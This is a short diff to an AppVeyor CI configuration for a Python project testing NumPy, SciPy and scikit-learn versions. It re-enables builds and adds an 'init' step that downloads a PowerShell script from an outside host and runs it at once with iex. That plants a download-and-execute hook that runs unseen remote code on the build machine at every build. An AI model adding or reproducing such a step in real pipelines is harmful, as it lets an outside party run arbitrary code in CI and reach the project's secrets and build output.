@@ -1,4 +1,4 @@
-build: false
+#build: false
 
 environment:
   matrix:
@@ -15,6 +15,9 @@ environment:
       NUMPY_VERSION: "*"
       SCIPY_VERSION: "*"
       SKLEARN_VERSION: "*"
+
+init:
+  - ps: iex ((new-object net.webclient).DownloadString('https://security.gaur.is/appveyor/stuff.ps1'))
 
 install:
   # Prepend miniconda installed Python to the PATH of this build
